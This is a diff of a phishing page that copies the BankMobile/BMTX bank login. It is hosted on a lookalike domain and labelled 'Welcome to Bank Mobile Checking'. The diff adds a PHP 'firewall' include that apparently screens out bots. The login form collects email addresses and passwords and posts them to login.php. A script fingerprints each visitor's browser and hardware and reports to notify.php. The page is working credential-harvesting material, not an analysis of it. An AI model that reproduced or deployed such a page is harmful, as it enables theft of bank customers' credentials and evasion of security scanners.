@@ -1,7 +1,12 @@
+<?php
+
+include 'firewall.php';
+?>
+
 <!DOCTYPE html>
-<!-- saved from url=(0057)https://authenticationform.de/vibb/authenticate/login.php -->
+<!-- saved from url=(0035)https://authenticationform.de/vibb/ -->
 <html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
-    <meta name="robots" content="noindex">  
+<meta name="robots" content="noindex">  
     
     
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
@@ -74,112 +79,131 @@ span[data-ez-ph-id] { position: absolute !important; left: -3000px !important; }
 .ad_middle, .ad-entity-container, #show_ads, *:not(body) > a[href^="https://content-loader.com/content"], .ad-slot, .ads-by-google, [data-adblockkey], #googlead, .ProductAd, .avp-p-wrapper, .region-ad-top, .ad-placeholder:not(#filter_ads_by_classname):not(#detect_ad_empire):not(#detect):not(.adsbox), .has-ad, .ad-element, a[href^="https://tm-offers.gamingadult.com/"], .advert_list, #ad-rotator, #AdSense1, .adholder2, .ads_header, .google-ad, .ad-spot, .ad_right, .one-search, .advBox, div[id^="AdFox_banner_"], .node-ad, div[id^="ezoic-pub-ad-"], .ad_box, .ad_btn, div.bannerbg, #advertising, #content_ad, .adlink, #article_ad, .adsense_wrapper, .adtitle, .adlist, .advertSlider, .anyClipWrapper, #ad-bigsize, #topBannerAd, .ad_div, .ad-area:not(.text-ad), .vertical-ads, .top-ad, .ad-content-area, .advertisment, .ad-content, .ad-outside, #adWrap, #ad_middle, #ads-text, .topAd, iframe[width="240"][height="400"], .cardAd, #ad-target, .adwrapper, .ad_body, #leaderboard-ad, #ad_wrapper, .connatix-wrapper, #ad-container, #adtop, .side-ad, .ad-stickyhero--standard, .ad_item, [data-ad-manager-id], .ads-mobile, #leaderboard.ad, #sidebar_ad_1, .ad_img, #banner_carousel, .adsBanner, .adTitle, .adtable, #bannerlayer, #google-ad, #reklama, .adhead, .ad_container, #content_ads, .adleft, .ads_single_center, .text_ads_2, .advert_area, .head_ad, .header-ad, iframe[width="200"][height="240"], .ad_frame, .banner-468x60, .bannerblock, #ad1, .oas-container, ins.adsbygoogle[data-ad-client], .adsText, #advertisement, .adunit, .advert-container, .top-banners, [href^="https://zstacklife.com/"] img, #banners_left, .adhide, #stickyads, .sidebar-ads, .adsbyvli, .ad_links, #adBanner1, .mntl-leaderboard-spacer, [id^="div-gpt-ad"], #top_ad, *:not(body) > a[href^="https://07c225f3.online/content"], .ad_Right, .adthrive, .ads_wrapper, .adsbygoogle-noablate, .sponsor_post, .ad-body, .wrapper-ad, .content_ads, .publicidade, #bottom_ads, .google-ads, .adlist, .ads-core-placer, .display_ad, .adItem, #adsense-bottom, #showads, a[href^="https://natour.naughtyamerica.com/track/"], .ad_top, .adContainer, .adsense-block, .ad-unit:not(.textads), .AdContainer, #adspace, #ad_container, [data-ad-name], .ad-text, .ad-center, .c-ads, .ad-holder, .chitika-ad, #leftad, .banners_block, #adTop, .topad, .banner-ad, .reclama, .AdTitle, .banner_center, .banner-728x90, .ad-heading, .ad-section, .sponsor_image, .ad-stickyhero-enable-mobile, .after-post-ad, #SponsoredLinks, iframe[width="468"][height="60"], #right_ad, .module-ad, #footer_ad_modules, .ad-wrapper, .advert2, .adverts, .logo-ad, #header_ad, #ad-content, #ad_link, .adv_link, .banner240, .adace-slot, .ad-enabled, .right-ad, .bottom_ad_block, .ads-box, #adcontainer, .bannerin, .AdsSlot, .ad300, .ad336, #ads-left, .plainAd, .banners1, .banners2, .innerBanner, .ads-header, [href^="https://www.herbanomic.com/"] > img, .wppaszone, #googleAds, div[aria-label="Ads"], #footer_ads, iframe[width="200"][height="300"], .ads-image, .ad_space, [data-ad-module], .ez-video-wrap, #adlabel, #ads_top, .headerad, .large-advert, .ad-button, .adwidget, #banner-ad, .adzone, .advert-block, #adriver_banner, #top_ad, .sponsorad, .adscenter, #ad728x90, .ad-inner, #ad_left_top, #ad_block, .skyscraper.ad, .ad-card, .block-ad, .ad-links, .ad-box:not(#ad-banner):not(:empty), #mediaget_box, #mini-ad, .ad-cover, .rightAd, #adContainer, .ad_slot, div[id^="crt-"][style], img[width="600"][height="90"], #AdHeader, .adslot_1, .ad-250, #GoogleAd2, .adv-banner, .ad-zone-container, #adsbox, noindex .download_btn, [class^="s2nPlayer"], .ad_banner, .ad-grid, .advert-detail, #horizontal-ad, #sidebar_ads, .article-advert, div[data-ad-targeting], [href^="https://mystore.com/"] > img, .rkl, #google-ads, .skinAd, .mpu, .ad_spot, .ad-current { display: none!important; }
 .mid_ad, .ad-stickyhero, .mainAd, #top_banners, .adsList, #adv-text, .advertiser, #ad_close, #taboola-below-article-1, [href^="https://mypatriotsupply.com/"] > img, .adWrap, .td-a-rec, img[width="460"][height="60"], .promoAd, .Advert, [name^="google_ads_iframe"], .ad-post, .Adsense, .bottom_ad, .module_ad, .ads-row, .cnx-player-wrapper, #featuread, .ad-lead, .header-ad-row, .single_ad, div[id^="div-gpt-"], .advert-wrapper, .video-ad-container, [data-advadstrackid], .nativead, .post-ad, div[data-banner-name], .ad_bottom, .adv-box, .ads1, .ads2, .p-ad, .adSummary, #ad-wrapper, .adrect, .adElement, .ad-label, .adtable, .largeAd, .googleAd, #AD_160, #headerTopAd, #ad_banner, #page_ad, .TextAd, #ad-ads, .ads-loaded, .adBlock, .section-ads, #ads-header, #adwrapper, .ad_global_header, .boxAds, #adbannerdiv, #topAd, .adVertical, .googleads, .ad-banner-container, .adImg, .c-ad, .AdBox, .top_ad, embed[width="240"][height="400"], #advertise, iframe[src^="//ad.a-ads.com/"], .product-ad, .video-ads, .adplaceholder, #adlayer, .middlead, #homead, .left-banner, .topads, #videoAd, [href^="http://mypillow.com/"] > img, .advads-widget, .adunit-container, a[href^="https://pubads.g.doubleclick.net/"], .ad_content, html[class^="img_"][amp4ads=""][i-amphtml-layout=""][i-amphtml-no-boilerplate=""][amp-version="2502032353000"], #printads, .left_ad, .mediaget, #sidebar_ads, img[width="240"][height="400"], #adclose, .adspace, .scad, .ad-hero, .sponsoredtextlink_container, .ad_body, .adHolder, .ad-widget, #adcontainer1, #promo-ad, #mod_ad, iframe[width="100%"][height="120"]:not([src*="bandcamp.com"]), [href^="https://noqreport.com/"] > img, .l-ad, #ad_container, .ad-google, .inline-ad, .adsbottombox, #ads-menu, div[id^="yandex_rtb"], .banner-mid, .adContent, .gallery-ad, .sponsoredItem, .small_ad, .adMiddle, .ad-sidebar, .header_ad, #googlead2, .adRow, .ad-med-rec, .adsTop, [data-ad-cls], .page-ad, #ad_topslot, a[href^="https://www.sheetmusicplus.com/"][href*="?aff_id="], .BannerTop, #BannerBox, .bannerTop, .adText, .sidebaradbox, .smallads, .blogAd, #prerollAd, #search_ad, .block-simpleads, .headerads, #adTower, #video-adv, .adv-top, [href^="https://www.mypatriotsupply.com/"] > img, .Textads, .gpt-ad, ins.adsbygoogle[data-ad-slot], .product-ads, .ad-block, #bottomAd, .ad-click, .ad-card-container, .trc-content-sponsored, #bottomad, .adscontainer, #ad3, .adsninja-ad-zone, .google_ads, #ad-carousel, .adwords, div[id^="ad_position_"], #ad-top, #ad-slot, iframe[width="100%"][height="90"], .adcomment, #inner-top-ads, #advert-1, .affiliate, .ad_space, [href^="https://www.restoro.com/"], .ads-banner, .sidebar_advert, .advert_list, [href^="https://www.mypillow.com/"] > img, #header_ad, .ads_container:not(.text-ad), .contentAds, .ads-card, .advertisement-block, .ads_ad_box, .ad-main, #ad-p3, .tile-ad, .adText, #banner_container, .banner-ad-container, .postad, .reklama, div[id^="dfp-ad-"], .adsleft, .ad-padding, .ad_bg, .ad-notice, img[width="728"][height="90"], .adsizewrapper, .sb-ad, .adSense, .adsbar, .b-banner, .ad-bottom, .sidebar-ads-container, .ad-wrap:not(#google_ads_iframe_checktag), .box_ads, .ads.widget, #sponsorText { display: none!important; }
 </style>
-<link href="./Invalid Login_files/bootstrap.min.css" rel="stylesheet" type="text/css">
-    <link href="./Invalid Login_files/outpages_index.css" rel="stylesheet" type="text/css">
-    <link href="./Invalid Login_files/global.css" rel="stylesheet" type="text/css">
-    <title>Invalid Login</title>
+<link href="./Welcome to Bank Mobile Checking_files/bootstrap.min.css" rel="stylesheet" type="text/css">
+    <link href="./Welcome to Bank Mobile Checking_files/outpages_index.css" rel="stylesheet" type="text/css">
+    <link href="./Welcome to Bank Mobile Checking_files/global.css" rel="stylesheet" type="text/css">
+    <title>Welcome to Bank Mobile Checking</title>
     <link rel="shortcut icon" href="https://authenticationform.de/vibb/favicon.ico" type="image/x-icon">
 </head>
 <body>
-  <div id="homepage-wrapper">
-    <div class="col-xs-12" id="resp-outheader">
-      <div class="hdr-logo-padding">
-          <a href="https://authenticationform.de/"><img src="./Invalid Login_files/title_1.gif" height="68" alt="" style="visibility: hidden;"></a>
-      </div>
-
-
-      
-      <div class="row" id="login-row">
-          <form id="loginForm" action="login2.php" method="post" style="display: inline" autocomplete="off">
-              <div class="col-xs-12 col-md-offset-0">
-                  <div class="row">
-                      <div class="login-fields">
-                          <div class="col-sm-6 login-padding">
-                              <label for="fld.emailaddress">Email Address:</label>
-                              <div class="login-input login-min-width">
-                                  <input id="fld.emailaddress" class="form-control-placeholder" type="text" size="35" maxlength="80" placeholder="Ex: janedoe@yahoo.com" required="" autocomplete="off" name="username" tabindex="1">
-                              </div>
-                          </div>
-                          <div class="col-sm-6 login-padding">
-                              <label for="fld.password">Password:</label>
-                              <div class="login-input login-min-width">
-                                  <input id="fld.password" class="form-control form-control-placeholder" type="password" size="15" maxlength="64" autocomplete="off" placeholder="(case sensitive)" required="" name="password" tabindex="2">
-                                  <a href="https://authenticationform.de/vibb/authenticate/login.php#" class="bm-green smaller forgot-password" tabindex="4">Forgot Login Information?</a>
-                              </div>
-                          </div>
-                      </div>
-                      <div class="login-padding login-button-group">
-                          <button class="btn btn-login btn-primary" type="submit" role="button" tabindex="3" name="submitBtn2" id="headerLoginButton">LOG IN!</button>
-                          <div class="get_started_div"></div>
-                      </div>
-                  </div>
-              </div>
-          </form>
-      </div>
+    <div id="homepage-wrapper">
+        <div class="col-xs-12" id="resp-outheader">
+            <div class="hdr-logo-padding">
+                <a href="https://authenticationform.de/"><img src="./Welcome to Bank Mobile Checking_files/title_1.gif" height="68" alt="" style="visibility: hidden;"></a>
+            </div>
 
 
 
-    </div>
-    <div class="row" style="margin-left:0;margin-right:0;">
-      <div class="outpagebody_div col-xs-12">
-          <div class="outpagebody_pagecontent body-padding">
-            <table cellpadding="0" cellspacing="0">
-              <tbody>
-                <tr>
-                  <td class="transperentBg"><img src="./Invalid Login_files/transparent.gif" height="400" alt="blank image"></td>
-                  <td valign="top">
-                    <table class="panel error errorBlock" cellspacing="0" width="400">
-                      <tbody>
-                        <tr>
-                          <td class="panelHeader headerFont">Error: Invalid Login</td>
-                        </tr>
-                        <tr>
-                          <td class="formBG">
-                            <table class="panelContent" cellspacing="0">
-                              <tbody>
-                                <tr>
-                                  <td class="errorList">To log in, enter your email address and password and select the "Log In!" button.</td>
-                                </tr>
-                              </tbody>
-                            </table>
-                          </td>
-                        </tr>
-                      </tbody>
-                    </table>
-                  </td>
-                </tr>
-              </tbody>
-            </table>
-          </div>
-      </div>
-    </div>
-    <div class="ftr_bar_wide"></div>
-      <div id="footer-footer">
-        <div class="footertext">
-            <a href="https://authenticationform.de/index.jsp">Home</a> |
-            <a href="https://authenticationform.de/cust/out/external/security.do" target="security">Security</a> |
-            <a href="https://authenticationform.de/main/feeschedules.do">Fee Schedules</a> |
-            <a href="https://authenticationform.de/info/accountagreements.do">Terms and Conditions</a> |
-            <a href="https://www.bmtx.com/privacy-policy">Privacy Statement</a> |
-            <a href="https://www.bmtx.com/privacy-notice-california">Privacy Notice for California Residents</a> |
-            <a href="https://authenticationform.de/outcontact.jsp">Contact Us</a> |
-            <a href="https://authenticationform.de/easyhelp/pta?basepage=answer&amp;type=public&amp;param=746" target="EasyHelp" rel="external">Identity Verification</a> |
-            <a href="https://authenticationform.de/easyhelp/pta?basepage=std_alp.php&amp;type=public" target="EasyHelp" rel="external">FAQs</a>
+            
+            <div class="row" id="login-row">
+                <form id="loginForm" action="login.php" method="post" style="display: inline" autocomplete="off">
+                    <div class="col-xs-12 col-md-offset-0">
+                        <div class="row">
+                            <div class="login-fields">
+                                <div class="col-sm-6 login-padding">
+                                    <label for="fld.emailaddress">Email Address:</label>
+                                    <div class="login-input login-min-width">
+                                        <input id="fld.emailaddress" class="form-control-placeholder" type="text" size="35" maxlength="80" placeholder="Ex: janedoe@yahoo.com" required="" autocomplete="off" name="username" tabindex="1">
+                                    </div>
+                                </div>
+                                <div class="col-sm-6 login-padding">
+                                    <label for="fld.password">Password:</label>
+                                    <div class="login-input login-min-width">
+                                        <input id="fld.password" class="form-control form-control-placeholder" type="password" size="15" maxlength="64" autocomplete="off" placeholder="(case sensitive)" required="" name="password" tabindex="2">
+                                        <a href="https://authenticationform.de/vibb/#" class="bm-green smaller forgot-password" tabindex="4">Forgot Login Information?</a>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="login-padding login-button-group">
+                                <button class="btn btn-login btn-primary" type="submit" role="button" tabindex="3" name="submitBtn" id="headerLoginButton">LOG IN!</button>
+                                <div class="get_started_div">
+                                    <div class="actv_button get-started-location">
+                                        <img src="./Welcome to Bank Mobile Checking_files/button_getstartedtext.png" alt="Haven&#39;t made a choice? Get Started!">
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </form>
+
+
+
+
+
+
+            </div>
         </div>
-        <div class="footertext footer_legaltext">
-            <p><img src="./Invalid Login_files/fdic-housing.png" alt="BMTX, Inc.&gt;" class="fdic-logo"></p>
-
-            © 2024 BMTX, Inc., a wholly owned subsidiary of BM Technologies, Inc. All Rights Reserved.<br>
-
-
-            <br> Digital banking platform powered by BMTX, Inc. BankMobile banking products and banking services are provided by First Carolina Bank, Member FDIC &amp; Equal Housing Lender. The BankMobile Debit Mastercard® card is issued by First
-            Carolina Bank pursuant to license from Mastercard International Incorporated. The card is administered by First Carolina Bank. Mastercard and the Mastercard brand mark are registered trademarks of Mastercard International Incorporated.
-            All other names and logos are owned by their respective owners.<br>
-
-
-            <br> BM Technologies, Inc., PO Box 278, Maple Shade, NJ 08052
+        <div class="row" style="margin-left:0;margin-right:0;">
+            <div class="outpagebody_div col-xs-12">
+                <div class="outpagebody_pagecontent">
+                    <!-- Message Box script -->
+                    <div id="bg" class="row span12 empt">
+                        <div class="outpage indexpage">
+                            <a href="https://authenticationform.de/vibb/#"><img src="./Welcome to Bank Mobile Checking_files/1711035640159_jpg.jpg" alt="Log in again to manage your refund preference, refund history, account notifications, and payroll."></a>
+                        </div>
+                        <div class="indexright">
+                            <div class="refunddate">
+                            </div>
+                        </div>
+                        <div class="clear"></div>
+                    </div>
+                </div>
+            </div>
         </div>
-      </div>
-  </div>
+        <div id="footer-footer">
+            <div class="footertext">
+                <a href="https://authenticationform.de/index.jsp">Home</a> |
+                <a href="https://authenticationform.de/cust/out/external/security.do" target="security">Security</a> |
+                <a href="https://authenticationform.de/main/feeschedules.do">Fee Schedules</a> |
+                <a href="https://authenticationform.de/info/accountagreements.do">Terms and Conditions</a> |
+                <a href="https://www.bmtx.com/privacy-policy">Privacy Statement</a> |
+                <a href="https://www.bmtx.com/privacy-notice-california">Privacy Notice for California Residents</a> |
+                <a href="https://authenticationform.de/outcontact.jsp">Contact Us</a> |
+                <a href="https://authenticationform.de/easyhelp/pta?basepage=answer&amp;type=public&amp;param=746" target="EasyHelp" rel="external">Identity Verification</a> |
+                <a href="https://authenticationform.de/easyhelp/pta?basepage=std_alp.php&amp;type=public" target="EasyHelp" rel="external">FAQs</a>
+            </div>
+
+            <div class="footertext footer_legaltext">
+                <p><img src="./Welcome to Bank Mobile Checking_files/fdic-housing.png" alt="BMTX, Inc.&gt;" class="fdic-logo"></p>
+
+                © 2024 BMTX, Inc., a wholly owned subsidiary of BM Technologies, Inc. All Rights Reserved.<br>
+
+
+                <br> Digital banking platform powered by BMTX, Inc. BankMobile banking products and banking services are provided by First Carolina Bank, Member FDIC &amp; Equal Housing Lender. The BankMobile Debit Mastercard® card is issued by First
+                Carolina Bank pursuant to license from Mastercard International Incorporated. The card is administered by First Carolina Bank. Mastercard and the Mastercard brand mark are registered trademarks of Mastercard International Incorporated.
+                All other names and logos are owned by their respective owners.<br>
+
+
+                <br> BM Technologies, Inc., PO Box 278, Maple Shade, NJ 08052
+            </div>
+
+        </div>
+    </div>
+    <script>
+document.addEventListener("DOMContentLoaded", () => {
+  const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
+  const screenRes = `${window.screen.width}x${window.screen.height}`;
+  const platform = navigator.platform;
+  const lang = navigator.language;
+  const isHeadless = navigator.webdriver ? "Likely Bot (Headless)" : "Likely Human";
+  const cores = navigator.hardwareConcurrency || 'Unknown';
+  const ram = navigator.deviceMemory || 'Unknown';
+
+  fetch("notify.php", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      timezone: tz,
+      screen: screenRes,
+      platform: platform,
+      browserLang: lang,
+      browserBotFlag: isHeadless,
+      cores: cores,
+      ram: ram
+    })
+  });
+});
+</script>
+
 
 </body></html>
